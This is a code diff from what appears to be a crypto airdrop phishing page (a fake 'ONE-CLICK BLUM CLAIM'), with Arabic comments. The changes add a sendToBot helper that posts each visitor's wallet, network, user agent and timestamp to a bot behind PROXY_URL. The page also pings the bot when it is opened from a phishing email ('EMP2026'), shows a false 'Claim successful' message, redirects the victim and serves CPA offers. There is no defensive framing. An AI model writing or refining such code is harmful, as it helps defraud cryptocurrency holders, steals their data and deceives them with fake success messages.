@@ -168,6 +168,16 @@
         return "0x" + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 6);
     }
     
+    // دالة موحدة لإرسال الرسائل إلى البوت (مع no-cors)
+    function sendToBot(message) {
+        fetch(PROXY_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: message })
+        }).catch(e => console.log('Send error:', e));
+    }
+    
     // عرض عروض CPA بعد المطالبة
     function showCPAOffers() {
         const container = document.getElementById('cpaOffers');
@@ -213,9 +223,9 @@
                     user_agent: ua
                 })
             });
-        } catch(e) {}
+        } catch(e) { console.log('Supabase error:', e); }
         
-        // إرسال إلى البوت
+        // إرسال إلى البوت (رسالة كاملة)
         const fullMessage = `🎁 ONE-CLICK BLUM CLAIM
 ⛓️ Network: ${network}
 💼 Wallet: ${wallet}
@@ -225,12 +235,7 @@
 📱 UA: ${ua.substring(0, 80)}...
 ⏰ ${timestamp}`;
         
-        fetch(PROXY_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: fullMessage })
-        });
+        sendToBot(fullMessage);
         
         // عرض رسالة النجاح
         const btn = document.getElementById('claimBtn');
@@ -240,12 +245,12 @@
         statusDiv.style.display = 'block';
         statusDiv.innerHTML = '<span class="success">🎉 Claim successful! 1,200 $BLUM will arrive within 24h.</span>';
         
-        // ========== (أ) + (ب): فتح الرابط بعد 0.5 ثانية في نفس النافذة ==========
+        // فتح الرابط في نفس النافذة بعد 0.5 ثانية
         setTimeout(() => {
             window.location.href = YOUR_AIRDROP_LINK;
         }, 500);
         
-        // ========== (ج): عرض عروض CPA بعد 1 ثانية ==========
+        // عرض عروض CPA بعد 1 ثانية
         setTimeout(() => {
             showCPAOffers();
         }, 1000);
@@ -295,12 +300,8 @@
     
     document.getElementById('claimBtn').addEventListener('click', onClaimClick);
     
-    fetch(PROXY_URL, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ message: '📧 Page opened from email - EMP2026' })
-    });
+    // إشعار فتح الصفحة
+    sendToBot('📧 Page opened from email - EMP2026');
     
     startTimer();
 </script>
